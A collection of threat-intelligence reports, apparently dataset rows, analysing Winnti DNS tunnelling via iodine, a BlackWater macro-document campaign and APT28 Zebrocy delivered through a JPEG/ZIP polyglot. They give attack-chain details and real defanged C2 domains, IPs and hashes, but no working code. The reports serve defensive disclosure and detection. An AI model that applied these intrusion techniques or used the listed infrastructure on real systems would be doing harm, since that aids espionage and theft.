software that enables the tunneling of IPv4 data through a DNS server. Interestingly, we are not aware of any earlier documentation highlighting Winnti specifically leveraging iodine for DNS tunneling. However, researchers at the Ruhr University Bochum, while hunting for DNS tunnels, [observed](https://www.farsightsecurity.com/assets/documents/A_Study_of_Newly_Observed_Hostnames_and_DNS_Tunneling_in_the_Wild.pdf) APT32 and Wekby APT groups using NULL and TXT records as a C2 communication channel, as well as mentioning the mooo[.]com top level domain in their findings. The implementation of iodine used in the Winnti sample is integrated and uses some custom wrapper, as evidence by the matching functions we discuss in further detail in the following section. **Use of Iodine for C2 DNS Tunneling** The iodine DNS tunneling solution is embedded in the DLL that is initially loaded and executed in memory, and includes at least the following 15 matching functions: *![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)![](https://quointelligence.eu/wp-content/uploads/2020/04/Table-3.png)* *Table 3 – Malware DLL Functions* For instance, the 64bit executable contains the build\_hostname function (Code 2), which corresponds with the older 32bit version (compiled with debug symbols) of iodine 0.6.0 (Code 3): ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/code_2.png) *Code 2- iodine\_0-6-0\_build\_hostname* ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/code-3.png) *Code 3- iodine\_0-6-0\_build\_hostname* Based on the presence of the functions base128\_blksize\_enc and base128\_blksize\_raw, we determined the version used, while not exactly known, is from before May 2017 when a patch removed those functions. Further, comparative analysis indicates that for the implementation of iodine in this Winnti attack operation, there is no perfect match for the two versions having 64bit pre-compiled binaries. This indicates iodine was compiled from source, and it is reasonable it is being used as a library, and not in its normal distribution format of a standalone executable. The DNS Tunneling technique adopted by the malware through the use of iodine is detailed in the figure below. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-3.png) *Figure 4 – C2 channel over DNS* 1.The malware generates a hostname and appends it to the embedded C2 dick[.]mooo[.]com, and makes a NULL query to the resulted FQDN (e.g. abcde is appended to .dick[.]mooo[.]com). Notably, NULL and TXT DNS request types are iodine’s preferred channels since they are “[*expected to provide the largest downstream bandwidth*](https://github.com/yarrick/iodine)”. It is hence not a coincidence that researchers at Ruhr University Bochum also observed an extensive use of NULL request types for DNS Tunneling purposes in their research. 2.The infected host sends the DNS query to one of the DNS servers included in the list populated at runtime, eventually to the OpenDNS fallback server. At this point the DNS server executes a recursive DNS query by contacting the Name Servers (NS) of each zone, until the Authoritative NS of dick[.]mooo[.]com is obtained. To note, FreeDNS does provide users the capability to delegate the authority of their subdomains to external NS. In the described scenario, attackers delegated the NS of their subdomain to use their NS as a de-facto C2 server. 3.The DNS server returns the authoritative answer by forwarding the content of the NULL record type to the infected host. Notably, the legit DNS server acts as a proxy between the infected host and the malicious server, by making impossible for defenders the application of any filtering at the Network (L3) level. **The NULL DNS record type** The implementation of NULL type tunneling can be observed in the following excerpt taken while reversing the malware: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-2.png) The third argument when calling dns\_encode shall be of the type “struct query” from Iodine’s [dns.c](https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/dns.c#L232) ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-4.png) According to [common.h](https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/common.h#L86), “struct query” is defined as: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-6-300x192.png) Since QUERY\_NAME\_SIZE equals to 512 (4 *128 – integers are 4 bytes) the query[128] call obtained from the reversing activity is indeed the DNS query type. As noted, reversing activity detailed the query[128] value to be 0xa. From Iodine’s [windows.h](https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/windows.h#L39) T\_NULL is DNS\_TYPE\_NULL ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-7-300x136.png) Finally, from [Windows’s documentation](https://docs.microsoft.com/en-us/windows/win32/dns/dns-constants), DNS\_TYPE\_NULL is actually a Windows constant equal to 0xa ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-8-274x300.png) ### Winnti Signed Code With Digital Certificate from IQ Technology During our analysis of the Winnti sample configured to target the German chemical company, our comparative analysis of other Winnti related drivers revealed a digital certificate issued to *IQ Technology*, a Taiwanese company producing Natural language processing (NLP) and Artificial Intelligence (AI) software. The rootkit driver aligns with the already known driver1.sys*.* While it is a known TTP that Winnti attributed attacks have involved stolen digital certificates for code signing its malware components, the use of this certificate is not publicly discussed, except for a brief report from a security researcher apparently associated with a Vietnamese security company. Although the report is no longer online, the discussed [sample](https://hybrid-analysis.com/sample/a5d6139921576c3aedfc64e2b37ae1a64f3160bd1bb70d4fc7fce956029e7d55?environmentId=2&lang=en) contains a compilation timestamp of August 2015, which is the earliest one observed in the wild that we identified using this digital certificate. At the time of analysis, the digital certificate was already revoked. The sample’s structure, debug symbols, and explanatory debug messages included within suggests it is highly likely be a development version. Additionally, the compilation timestamp indicates the sample was created 20 minutes prior to the *driver1.sys.* Both samples are highly related, and its contents combined with the date of analysis and reporting essentially solidify that it existed in 2015; however, this does not necessarily corroborate to an attack timeframe. ### Sample Targeting South Korean Gaming Company | **HASHES** | **Compilation Timestamp** | | **MD5:** 00961922e22e6a5d30b1d6fbd667d3c4 **SHA1**: 0fd54c26b593bd9e9218492d50d8873521c0ec0d **SHA256:** 4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9 | 2016-03-07 09:44:01 | *Table 3 – observed network IoCs in Winnti sample* On 21 February, we detected the new submission of a 64-bit Winnti executable to a public online malware scanning service. As multiple researchers have reported, Winnti operators embed the name of their target directly into the malware, but in an obfuscated manner. **Binary Analysis** The sample resembles the Winnti Dropper Install.exe described by ESET, since it is a command line executable used to drop and load additional encrypted payload: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/rundl.png) Unfortunately we were not able to find the payload meant to be decrypted by this dropper. However, we were able to extract the malware’s configuration file and identify the intended target. In this case, the following string was included within the extracted configuration: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/gravity.png) Based on previous knowledge and targeting of the Winnti Group, we assess that this sample was likely used to target Gravity Co., Ltd., a South Korean video game company. The company is known for its Massive Multiplayer Online Role Playing Game (MMORPG) [*Ragnarok Online*](http://www.gravity.co.kr/en/games/), which is also offered as a mobile application. As we have also reported in the past, the video game industry is one of the preferred targets of the Winnti Group, especially for those companies operating in South Korea and Taiwan. Interestingly, ESET researchers, while reporting on multiple Winnti Group campaigns targeting the video game industry, listed in their report a C2 server having a Campaign ID ***GRA** KR 0629*. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://quointelligence.eu/wp-content/uploads/2020/04/Picture-9.png) *Excerpt from ESET Research White paper “*[*CONNECTING THE DOTS Exposing the arsenal and methods of the Winnti Group*](https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Winnti.pdf)*”* At this time, we do not have any further evidence supporting a potential link between the sample we analysed and the C2 detailed by ESET, but the coincidence between the C2 Campaign ID/Location with the Campaign ID we extracted from the Winnti dropper is worth noting. ### Conclusion The Winnti Group has exhibited their ability to breach different organizations and conduct sophisticated attack operations, typically motivated by espionage and financial gain, with various TTPs and malware toolkits. While attribution is not concrete due to the complexity of the group, there are links that can be drawn between operations which suggest the threat actors purporting the attacks are likely operating within the Winnti Group, or at least sharing resources. The detection of this unreported Winnti variant uploaded to VirusTotal and targeting a German chemical company aligns with our prior observations and research from [previous intelligence reporting](https://web.br.de/interaktiv/winnti/index.html)highlighting Winnti Group’s interest in German DAX companies. As a result, organizations of all sizes, but especially small to medium sized companies, including Germany’s *hidden champions*, should prepare against such threats as they are vital to the economic ecosystem and continuous development of niche markets. Government oversight (local, regional, and across the EU) should ensure susceptible organizations such as these are following regulation and implementing security best practices to protect against future attacks. Appendix -------- ### Indicators of Compromise 4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9 cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986 1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2 8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860 df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c 4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9 cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986 1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2 8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860 df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c *.dick[.]mooo[.]com 208[.]67[.]222[.]222 45[.]248[.]85[.]200 ### MITRE ATT&CK | **Tactic** | **Technique** | **Recommended Course of Action** | | Persistence / Privilege Escalation | [T1215](https://attack.mitre.org/techniques/T1215/) Kernel Modules and Extensions [T1068](https://attack.mitre.org/techniques/T1068/) Exploitation for Privilege Escalation | Anti-Virus software and Advanced End-Point solution can drastically reduce the risk of both techniques. | | Defense Evasion | [T1009](https://attack.mitre.org/techniques/T1009/) Binary Padding [T1014](https://attack.mitre.org/techniques/T1014/) Rootkit [T1116](https://attack.mitre.org/techniques/T1116/) Code Signing | Many of the samples analysed were signed with expired / revoked certificate. Enforce signature validation via Group Policies for executables | | Exfiltration | [T1022](https://attack.mitre.org/techniques/T1022/) Data Encrypted [T1048](https://attack.mitre.org/techniques/T1048/) Exfiltration Over Alternative Protocol | – For DNS Tunnel, ensure that DNS logs are collected and reviewed. – DNS telemetic data should be also collected in order to spot frequent and heavy loaded DNS communication that are definitely not related to an usual DNS query. – FreeDNS and DynDNS servers should be blacklisted/synkholed if not strictly required – DNS NULL type queries should not be avoided. Only the required record types should be allowed. | * [Follow](https://twitter.com/QuoIntelligence ""Follow on Twitter"")[Follow](https://twitter.com/QuoIntelligence ""Twitter"") * [Follow](https://www.linkedin.com/company/quointelligence/ ""Follow on LinkedIn"")[Follow](https://www.linkedin.com/company/quointelligence/ ""LinkedIn"") Join Our Newsletter. -------------------- Subscribe to our newsletter to receive Weekly Intelligence Summaries, cyber news, and exciting updates. Only valid business emails will be approved. Please enable JavaScript in your browser to complete this form.Name *FirstLastBusiness Email *Checkboxes ** I have read and agree to the [Privacy Policy](https://quointelligence.eu/privacy-policy). GDPR Agreement ** I consent to having this website store my submitted information so they can respond to my inquiry. MessageSubscribe"
annoctr,annoctr/AnnoCTR/text/train/quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy.txt,quoteintelligence_2020-08-07_blackwater-malware-leveraging-beirut-tragedy,G0019,"BlackWater Malware Leveraging Beirut Tragedy in New Targeted Campaign Aug 7, 2020 ### **[Updated on August 11, 2020]** Executive Summary ----------------- * [QuoIntelligence](https://quointelligence.eu/) discovered a new targeted campaign delivering the novel BlackWater malware * The campaign used the Beirut incident to lure the targets, with an attempt to spoof an official OSCE report * The campaign was launched on 5 August, only one day after the Beirut incident. The provider hosting the attack infrastructure promptly shot down the C2 servers after our notification on 7 August * The attack used state-of-the-art techniques, such as DNS over HTTPs (DoH) * Based on the advanced TTPs and the discovered targets, we classify the threat actor as an Advanced Persistent Threat (APT) group named “ReconHellcat” * Observed ReconHellcat targets consist of -at least- defense and diplomatic government bodies in Bulgaria and Azerbaijan Introduction ------------ On 6 August, QuoIntelligence discovered a malicious file uploaded to VirusTotal using the Beirut incident as a theme to lure the targets. Further analysis attributed the analysed artifact to BlackWater: [a recently-discovered](https://www.bleepingcomputer.com/news/security/blackwater-malware-abuses-cloudflare-workers-for-c2-communication/) malware that uses [Cloudflare Workers](https://blog.cloudflare.com/cloudflare-workers-unleashed/) as a C2 communication interface and DNS over HTTPS (DoH) as name resolution channel. We publicly disclosed our preliminary results on 7 August and made Cloudflare aware of the malicious infrastructure. Cloudflare promptly shutdown the C2 servers after our notification. Technical Analysis ------------------ On 5 August, a compressed archive was uploaded to [VirusTotal](https://www.virustotal.com/gui/file/b4ed39b6852bce329686ec44e2e8e39b1c0be9b7095cec2e1682e6e2ef724c69) from Azerbaijan, containing a malicious, macro-enabled Word Document (maldoc) themed for the recent explosion in Beirut. The name of the maldoc (*047-20 – OSCE Report Beirut explosion.doc*) might indicate attackers’ intent to spoof the [Organization for Security and Co-operation in Europe](https://www.osce.org/) (OSCE), however, we discovered that attackers weaponized a legit Word document available in the web portal of the [Organismo Supervisor de las Contrataciones del Estado](https://www.gob.pe/en/osce) (OSCE), which is a supervisory body of the Peruvian Ministry of Economy. The image below shows the comparison between the maldoc and the legit Word file from the Peruvian OCSE available in their website. ![Blackwater](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![Blackwater](https://quointelligence.eu/wp-content/uploads/2020/08/maldoc_vs_legit-1024x433.png) The maldoc contains an obfuscated macro that retrieves the second-stage encrypted payload from one of the three hardcoded C2 URLs depending on the user’s Windows version. To decrypt the payload, attackers implemented the old-fashion substitution cipher technique *[Book cipher](https://en.wikipedia.org/wiki/Book_cipher)*using the legit Windows file `C:\Windows\Fonts\cambriab.tff` as key. To note that the content of this file differs depending on the Windows version , this is why the malicious macro checks the Windows version at the beginning of its execution, and contacts a specific URL depending of the result of this check. Finally, the decrypted payload is written in `%APPDATA%\\Microsoft\Word\STARTUP\Moon.wll` . By storing a Word add-in in such path allows Microsoft Word to load and execute it a malicious payload whenever it is launched. Although this technique ([T1137/006](https://attack.mitre.org/techniques/T1137/006/)) was firstly documented by F-Secure in 2017, only this year researchers publicly reported two APT groups firstly using it: [Naikon APT](https://research.checkpoint.com/2020/naikon-apt-cyber-espionage-reloaded/) and [Vicious Panda](https://research.checkpoint.com/2020/vicious-panda-the-covid-campaign/). The malicious `Moon.wll`contains another encrypted set of three different C2 URLs, and once executed by Word, it downloads an encrypted x64 executable as the final backdoor. The decryption technique used to decrypt the x64 backdoor still uses the Windows font file as key, however, the C2 URL is passed as an encrypted parameter which is decrypted via a different substitution cipher relying on an hardcoded alphabet as a key. Finally, the Blackwater backdoor starts communicating with the Clouldflare Worker via JSON. Notably, both the loader and the backdoor resolve the C2 hostnames via DNS-over-HTTP (DoH) by using a built-in feature of libcurl. Only the malicious Macro is using the system’s default DNS server to get the first-stage payload. To note that all the samples we have analysed had a very low AV detection rate when they were firstly uploaded to VirusTotal. The C2 infrastructure was hosted on Cloudflare Workers platform, which is a service enabling users to register a subdomain and then have serverless code running to handle requests. Attribution ----------- Our technical findings overlap with the Tactics, Techniques and Procedures (TTPs) previously attributed to the BlackWater malware campaign first identified in March: * Compressed archive containing a maldoc * Blackwater strings within the malware * DoH communications using `cloudflare-dns.com` * C2 hosted on Cloudflare Workers service * JSON encoded communications As shown in the picture below, the analysis of the x64 sample revealed multiple strings containing the word “BlackWater”. ![Blackwaters](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![Blackwaters](https://quointelligence.eu/wp-content/uploads/2020/08/code_snippet-1024x405.png) We researched the targets of both BlackWater campaigns (March and August) and concluded that -at least- defense and diplomatic government bodies in Bulgaria and Azerbaijan were highly likely targeted. Based on the advanced TTPs and the targeted institutions we classify the threat actor as an Advanced Persistent Threat (APT) group. Since we have not found yet any solid overlap with any already-known APT group, we are naming the attackers behind the two BlackWater campaigns as “ReconHellcat”. Do you want to stay informed of cyber and geopolitical threats targeting *your* organization. Are you interested in receiving exclusive and unpublished intelligence. [Get in touch!](https://quointelligence.eu/#contact) Appendix I ---------- Early Indicators of Compromise ------------------------------ **047-20 – OSCE Report Beirut explosion.rar** b4ed39b6852bce329686ec44e2e8e39b1c0be9b7095cec2e1682e6e2ef724c69 **047-20 – OSCE Report Beirut explosion.doc** 8b5ae22661e690b6689ea5894cb05e288c64927c2f0ccf8c11c814ad56968376 **Second Stage – Office Plugin – moon1.wll** 9b35a2bddc006ff5ab7262f5fb15f8c7ab9aee8f34bf02815f81f0c74222438b **Third-stage x64**(decrypted) f984bc0896813553ec8b6dbb9b72769b3bbc8fbbe401566049df2e2061f1a829 https://b1[.]earth09[.]workers[.]dev/ https://b2[.]earth09[.]workers[.]dev/ https://b3[.]earth09[.]workers[.]dev/ https://moon3[.]earth09[.]workers[.]dev https://moon1[.]earth09[.]workers[.]dev https://moon2[.]earth09[.]workers[.]dev * [Follow](https://twitter.com/QuoIntelligence ""Follow on Twitter"")[Follow](https://twitter.com/QuoIntelligence ""Twitter"") * [Follow](https://www.linkedin.com/company/quointelligence/ ""Follow on LinkedIn"")[Follow](https://www.linkedin.com/company/quointelligence/ ""LinkedIn"")"
annoctr,annoctr/AnnoCTR/text/train/quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato.txt,quoteintelligence_2020-09-22_apt28-zebrocy-malware-campaign-nato,G0007,"APT28 Delivers Zebrocy Malware Campaign using NATO Theme as Lure Sep 22, 2020 **Executive Summary** --------------------- * On 9 August, [QuoIntelligence](https://quointelligence.eu/) detected an ongoing APT28 campaign, which likely started on 5 August. * The malware used in the attack was the Zebrocy Delphi version. All the artifacts had very low Anti-Virus (AV) detection rates on VirusTotal when they were first submitted. * At the time of the discovery, the C2 infrastructure hosted in France was still live. * The campaign used NATO’s upcoming trainings as a lure. * The campaign targeted a specific government body in Azerbaijan, however; it is likely that attackers also targeted NATO members or other countries involved in NATO exercises. * Analysis revealed interesting correlations with ReconHell/BlackWater attack, which we [uncovered](https://quointelligence.eu/2020/08/blackwater-malware-leveraging-beirut-tragedy-in-new-targeted-campaign/) in August. * As part of our responsible disclosure, we reported our findings to French authorities for taking down the C2, and to NATO for their awareness. **Introduction** ---------------- On 9 August, QuoIntelligence disseminated a Warning to its government customers about a new APT28 (*aka* Sofacy, Sednit, Fancy Bear, STRONTIUM, etc. campaign targeting government bodies of [NATO](https://www.nato.int/) members (or countries cooperating with NATO). In particular, we found a malicious file uploaded to VirusTotal, which ultimately drops a Zebrocy malware and communicates with a C2 in France. After our discovery, we reported the malicious C2 to the French law enforcement as part of our responsible disclosure process. Zebrocy is a malware used by APT28 (also known as Sofacy), which was reported by multiple security firms[[1]](#_ftn1)[[2]](#_ftn2)[[3]](#_ftn3)[[4]](#_ftn4)[[5]](#_ftn5)[[6]](#_ftn6) in the last two years. Finally, our investigation concluded that the attack started on 5 August and targeted at least a government entity located in the Middle East. However, it is highly likely that NATO members also observed the same attack. Technical Analysis ------------------ | **File Name** | Course 5 – 16 October 2020.zipx | | **SHA256** | e6e19633ba4572b49b47525b5a873132dfeb432f075fbba29831f1bc59d5885d | | **First Submission to VT** | 2020-08-05T12:28:27 | | **First AV detetction rate** | Really Low (3/61) | At a first look, the sample seems to be a valid JPEG image file: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""file_type"") ![](https://quointelligence.eu/wp-content/uploads/2020/09/code_snippet1.png ""file_type"") In fact, if the file is renamed as a JPG, the Operating System will show the logo of the Supreme Headquarters Allied Powers Europe ([SHAPE](https://shape.nato.int/)), which is the NATO’s Allied Command Operations (ACO) located in Belgium. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""courses_zipx"") ![](https://quointelligence.eu/wp-content/uploads/2020/09/courses_zipx.png ""courses_zipx"") However, further analysis revealed the sample as having a Zip file concatenated. This technique works because JPEG files are parsed from the beginning of the file and some Zip implementations parse Zip files from the end of the file (since the index is located there) without looking at the signature in the front. The technique is also used by threat actors to evade AVs, or other filtering systems since they might mistake the file for a JPEG and skip it. Interestingly, in order to trigger the decompression of the file on Windows after the user clicks on it, the following conditions need to be met: a) the file must be correctly named .zip(x); b) the file needs to be opened with WinRAR. The file will show an error message claiming it is corrupted if the targeted victim uses WinZip or the default Windows utility. After decompressing the appended ZIP file, the following two samples are dropped: * Course 5 – 16 October 2020.exe (Zebrocy malware) SHA256: aac3b1221366cf7e4421bdd555d0bc33d4b92d6f65fa58c1bb4d8474db883fec * Course 5 – 16 October 2020.xls (Corrupted file) SHA256: b45dc885949d29cba06595305923a0ed8969774dae995f0ce5b947b5ab5fe185 Considering the lure uses a NATO image, the attackers likely picked the filenames in order to leverage upcoming [NATO courses](https://www.natoschool.nato.int/Academics/Portfolio/Course-Catalogue#2aid-aid) in October 2020. Additionally, the Excel file (XLS) is corrupted and cannot be opened by Microsoft Excel, it contains – what seems to be – information about military personnel involved in the military mission “African Union Mission for Somalia”. The long list of information includes names, ranks, unit, arrival/leave dates, and more. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""African_Union_Mission_for_Somalia"")![](https://quointelligence.eu/wp-content/uploads/2020/09/African_Union_Mission_for_Somalia.png ""African_Union_Mission_for_Somalia"") To note, QuoIntelligence was not able to determine if the information contained in the file is legitimate or not. One of the hypotheses explaining the corrupted file is an intentional tactic of the attacker. The rationale could be that the attacker makes the user attempt to first open the XLS file, and then open the .exe with the same filename as a second try. The .exe file has a PDF icon, so if file extensions are not shown, targeted users might be lured into opening the executable. | **File Name** | Course 5 – 16 October 2020.exe | | **SHA256** | aac3b1221366cf7e4421bdd555d0bc33d4b92d6f65fa58c1bb4d8474db883fec | | **First Submission to VT** | 2020-08-05T18:33:39 | | **First AV detection rate** | Really Low (9/70) | The sample analyzed is a Delphi executable. Since 2015, [multiple](https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/) [researchers](https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/) have already covered Zebrocy Delphi versions in-depth. Interestingly, last Zebrocy [observations](https://securelist.com/zebrocys-multilanguage-malware-salad/90680/) seemed to suggest a discontinuity of the Delphi versions in favor of a new one written in [Go language](https://securelist.com/a-zebrocy-go-downloader/89419/). Behavior Analysis ----------------- Once executed, the sample copies itself into %AppData%\Roaming\Service\12345678\sqlservice.exe by adding 160 random bytes to the new file. This padding is used to evade hash-matching security controls, since the dropped malware will always have a different file hash value. Next, the malware creates a new scheduled task, and it is executed with the /s parameter ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""code_snippet1"") ![](https://quointelligence.eu/wp-content/uploads/2020/09/code_snippet2.png ""code_snippet1"") The task runs regularly and tries to POST stolen data (e.g. screenshots) to hxxp://194.32.78[.]245/protect/get-upd-id[.]php ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""network_traffic_POST_1"") ![](https://quointelligence.eu/wp-content/uploads/2020/09/code_snippet3.png ""network_traffic_POST_1"") At a first glance, the data seems to be obfuscated and encrypted. Another request looks like this: ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""network_traffic_POST_2"") ![](https://quointelligence.eu/wp-content/uploads/2020/09/code_snippet4.png ""network_traffic_POST_2"") The heading number 12345678 (the original eight digits were redacted) seems to be constant, suggesting its use as a unique ID of the infected machine. Notably, the same number is also used by the malware while creating the folder that contains sqlservice.exe Letting the sample talk to its actual C2 on the Internet did not change its actual behavior during our analysis. The malware sends POST requests about once per minute without getting a response back. Additionally, the server closes the connection after waiting for about 10 more seconds. It is possible that this unresponsive behavior is due to the C2 determining the infected machine as not interesting. Lastly, the network traffic generated to the C2 triggers the following Emerging Threats (ET) IDS rule: * ET TROJAN Zebrocy Screenshot Upload” (SID: 2030122) Victimology and Attribution --------------------------- QuoIntelligence concludes with medium-high confidence that the campaign targeted a specific government body, *at* *least* in Azerbaijan. Although Azerbaijan is not a NATO member, it closely cooperates with the North-Atlantic organizations and participates in NATO exercises. Further, the same campaign very likely targeted other NATO members or countries cooperating with NATO exercises. By analyzing the Tactics, Techniques and Procedures (TTPs), the targeting, and the theme used as a lure, we have high confidence in attributing this attack to the well-known APT28/Zebrocy TTPs disclosed by the security community in the last year. An Interesting Coincidence. --------------------------- Although we could not find any strong causation link yet or solid technical link between the two attacks, it should be noted the following points correlating with the ReconHellcat campaign [we uncovered](https://quointelligence.eu/2020/08/blackwater-malware-leveraging-beirut-tragedy-in-new-targeted-campaign/) on August 11: * Both the compressed Zebrocy malware and the OSCE-themed lure used to drop the BlackWater backdoor were uploaded the same day, on 5 August. * Both samples were uploaded by the same user in Azerbaijan and are highly likely by the same organization. * Both attacks happened in the same timeframe. * OSCE and NATO are both organizations that have been targeted (directly or indirectly) by APT28 in the past. * The victimology we identified for the ReconHellcat campaign is in line with the one targeted by the Zebrocy attack (i.e. similar type of government bodies). The type of organizations targeted by both attacks is also in line with known APT28 victimology. * We assessed ReconHellcat as a high-capability APT group, like APT28. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== ""VT_times"") ![](https://quointelligence.eu/wp-content/uploads/2020/09/VT_times.png ""VT_times"") Citations --------- [[1]](#_ftnref1) ESET, A1, April 2018, [Sednit update: Analysis of Zebrocy](https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/) [[2]](#_ftnref2) Palo Alto, B1, June 2018, [Sofacy Group’s Parallel Attacks](https://unit42.paloaltonetworks.com/unit42-sofacy-groups-parallel-attacks/) [[3]](#_ftnref3) Kaspersky, A1, October 2018, [Shedding Skin – Turla’s Fresh Faces](https://securelist.com/shedding-skin-turlas-fresh-faces/88069/) [[4]](#_ftnref4) Kaspersky, A1, Janurary 2019, [A Zebrocy Go Downloader](https://securelist.com/a-zebrocy-go-downloader/89419/) [[5]](#_ftnref5) Kaspersky, A1, January 2019, [GreyEnergy’s overlap with Zebrocy](https://securelist.com/greyenergys-overlap-with-zebrocy/89506/) [[6]](#_ftnref6) Kaspersky, A1, June 2019, [Zebrocy’s Multilanguage Malware](https://securelist.com/zebrocys-multilanguage-malware-salad/90680/) Appendix I – IOCs ----------------- hxxp://194.32.78.245/protect/get-upd-id.php **Course 5 – 16 October 2020.zipx** 6e89e098816f3d353b155ab0f3377fe3eb3951f45f8c34c4a48c5b61cd8425aa **Course 5 – 16 October 2020.xls (Corrupted file)** b45dc885949d29cba06595305923a0ed8969774dae995f0ce5b947b5ab5fe185 **Course 5 – 16 October 2020.exe (Zebrocy malware)** aac3b1221366cf7e4421bdd555d0bc33d4b92d6f65fa58c1bb4d8474db883fec **Additional Zebrocy malware variants on VT** fae335a465bb9faac24c58304a199f3bf9bb1b0bd07b05b18e2be6b9e90d72e6 eb81c1be62f23ac7700c70d866e84f5bc354f88e6f7d84fd65374f84e252e76b MITRE ATT&CK ------------ | **TACTIC** | **TECHNIQUE** | | **Execution** | [T1047: Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047/) | | **Defense Evasion** | [T1140: Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140/) | | **Discovery** | [T1083: File and Directory Discovery](https://attack.mitre.org/techniques/T1083/) [T1135: Network Share Discovery](https://attack.mitre.org/techniques/T1135/) [T1120: Peripheral Device Discovery](https://attack.mitre.org/techniques/T1120/) [T1057: Process Discovery](https://attack.mitre.org/techniques/T1057/) [T1012: Query Registry](https://attack.mitre.org/techniques/T1012/) [T1082: System Information Discovery](https://attack.mitre.org/techniques/T1082/) [T1016: System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016/) [T1049: System Network Connections Discovery](https://attack.mitre.org/techniques/T1049/) [T1033: System Owner/User Discovery](https://attack.mitre.org/techniques/T1033/) [T1124: System Time Discovery](https://attack.mitre.org/techniques/T1124/) | | **Collection** | [T1560: Archive Collected Data](https://attack.mitre.org/techniques/T1560/) [T1119: Automated Collection](https://attack.mitre.org/techniques/T1119/) [T1113: Screen Capture](https://attack.mitre.org/techniques/T1113/) | | **Command and Control** | [T1105: Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) | | **Exfiltration** | [T1041: Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/) | Do you want to stay informed of cyber and geopolitical threats targeting *your* organization. Are you interested in receiving exclusive and unpublished intelligence. [Get in touch!](https://quointelligence.eu/talk-to-an-expert/) * [Follow](https://twitter.com/QuoIntelligence ""Follow on Twitter"")[Follow](https://twitter.com/QuoIntelligence ""Twitter"") * [Follow](https://www.linkedin.com/company/quointelligence/ ""Follow on 